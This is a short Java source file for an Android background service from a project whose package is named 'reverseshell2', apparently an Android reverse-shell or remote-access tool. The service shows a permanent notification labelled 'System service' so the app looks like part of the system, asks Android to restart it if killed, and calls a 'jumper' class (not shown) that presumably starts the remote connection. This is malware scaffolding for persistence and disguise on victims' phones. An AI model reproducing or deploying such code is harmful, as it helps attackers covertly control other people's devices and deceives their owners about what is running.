package com.example.reverseshell2;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class mainService extends Service {
    static String TAG = "mainServiceClass";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "in");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            new functions(null).createNotiChannel(getApplicationContext());
            Notification notification = new NotificationCompat.Builder(this, "channelid")
                    .setContentTitle("System service")
                    .setContentText("Running")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setOngoing(true)
                    .build();
            ForegroundCompat.start(
                    this, 1001, notification, ForegroundCompat.typeDataSync());
        }
        new jumper(getApplicationContext()).init();
        return START_STICKY;
    }
}
